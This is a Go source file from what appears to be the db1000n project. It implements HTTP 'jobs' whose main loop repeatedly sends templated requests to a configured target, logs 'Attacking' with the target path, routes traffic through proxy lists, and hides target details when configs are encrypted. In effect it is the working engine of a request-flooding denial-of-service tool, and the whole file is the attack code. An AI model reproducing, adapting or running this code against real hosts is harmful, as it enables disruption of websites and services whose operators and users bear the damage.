// MIT License

// Copyright (c) [2022] [Bohdan Ivashko (https://github.com/Arriven)]

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package job

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/google/uuid"
	"github.com/valyala/fasthttp"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/core/http"
	"github.com/Arriven/db1000n/src/job/config"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
	"github.com/Arriven/db1000n/src/utils/templates"
)

type httpJobConfig struct {
	BasicJobConfig

	Request map[string]interface{}
	Client  map[string]interface{} // See HTTPClientConfig
}

func singleRequestJob(ctx context.Context, logger *zap.Logger, globalConfig *GlobalConfig, args config.Args) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	_, clientConfig, requestTpl, err := getHTTPJobConfigs(ctx, args, *globalConfig, logger)
	if err != nil {
		return nil, err
	}

	var requestConfig http.RequestConfig
	if err := utils.Decode(requestTpl.Execute(logger, ctx), &requestConfig); err != nil {
		return nil, err
	}

	client := http.NewClient(ctx, *clientConfig, logger)

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseResponse(resp)

	if !isInEncryptedContext(ctx) {
		log.Printf("Sent single http request to %v", requestConfig.Path)
	}

	dataSize := http.InitRequest(requestConfig, req)

	metrics.Default.Write(metrics.Traffic, uuid.New().String(), uint64(dataSize))

	if err = sendFastHTTPRequest(client, req, resp); err == nil {
		metrics.Default.Write(metrics.ProcessedTraffic, uuid.New().String(), uint64(dataSize))
	}

	headers, cookies := make(map[string]string), make(map[string]string)

	resp.Header.VisitAll(headerLoaderFunc(headers))
	resp.Header.VisitAllCookie(cookieLoaderFunc(cookies, logger))

	return map[string]interface{}{
		"response": map[string]interface{}{
			"body":        string(resp.Body()),
			"status_code": resp.StatusCode(),
			"headers":     headers,
			"cookies":     cookies,
		},
		"error": err,
	}, nil
}

func headerLoaderFunc(headers map[string]string) func(key []byte, value []byte) {
	return func(key []byte, value []byte) {
		headers[string(key)] = string(value)
	}
}

func cookieLoaderFunc(cookies map[string]string, logger *zap.Logger) func(key []byte, value []byte) {
	return func(key []byte, value []byte) {
		c := fasthttp.AcquireCookie()
		defer fasthttp.ReleaseCookie(c)

		if err := c.ParseBytes(value); err != nil {
			return
		}

		if expire := c.Expire(); expire != fasthttp.CookieExpireUnlimited && expire.Before(time.Now()) {
			logger.Debug("cookie from the request expired", zap.ByteString("cookie", key))

			return
		}

		cookies[string(key)] = string(c.Value())
	}
}

func fastHTTPJob(ctx context.Context, logger *zap.Logger, globalConfig *GlobalConfig, args config.Args) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	jobConfig, clientConfig, requestTpl, err := getHTTPJobConfigs(ctx, args, *globalConfig, logger)
	if err != nil {
		return nil, err
	}

	backoffController := utils.NewBackoffController(utils.NonNilBackoffConfigOrDefault(jobConfig.BackoffConfig, globalConfig.Backoff))

	client := http.NewClient(ctx, *clientConfig, logger)

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)

	processedTrafficMonitor := metrics.Default.NewWriter(metrics.ProcessedTraffic, uuid.NewString())
	go processedTrafficMonitor.Update(ctx, time.Second)

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	if !isInEncryptedContext(ctx) {
		log.Printf("Attacking %v", jobConfig.Request["path"])
	}

	for jobConfig.Next(ctx) {
		var requestConfig http.RequestConfig
		if err := utils.Decode(requestTpl.Execute(logger, ctx), &requestConfig); err != nil {
			return nil, fmt.Errorf("error executing request template: %w", err)
		}

		dataSize := http.InitRequest(requestConfig, req)

		trafficMonitor.Add(uint64(dataSize))

		if err := sendFastHTTPRequest(client, req, nil); err != nil {
			logger.Debug("error sending request", zap.Error(err), zap.Any("args", args))
			utils.Sleep(ctx, backoffController.Increment().GetTimeout())
		} else {
			processedTrafficMonitor.Add(uint64(dataSize))
			backoffController.Reset()
		}
	}

	return nil, nil
}

func getHTTPJobConfigs(ctx context.Context, args config.Args, global GlobalConfig, logger *zap.Logger) (
	cfg *httpJobConfig, clientCfg *http.ClientConfig, requestTpl *templates.MapStruct, err error,
) {
	var jobConfig httpJobConfig
	if err := ParseConfig(&jobConfig, args, global); err != nil {
		return nil, nil, nil, fmt.Errorf("error parsing job config: %w", err)
	}

	var clientConfig http.ClientConfig
	if err := utils.Decode(templates.ParseAndExecuteMapStruct(logger, jobConfig.Client, ctx), &clientConfig); err != nil {
		return nil, nil, nil, fmt.Errorf("error parsing client config: %w", err)
	}

	if global.ProxyURLs != "" {
		clientConfig.ProxyURLs = templates.ParseAndExecute(logger, global.ProxyURLs, ctx)
	}

	requestTpl, err = templates.ParseMapStruct(jobConfig.Request)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("error parsing request config: %w", err)
	}

	return &jobConfig, &clientConfig, requestTpl, nil
}

func sendFastHTTPRequest(client http.Client, req *fasthttp.Request, resp *fasthttp.Response) error {
	if err := client.Do(req, resp); err != nil {
		metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusFail)

		return err
	}

	metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusSuccess)

	return nil
}
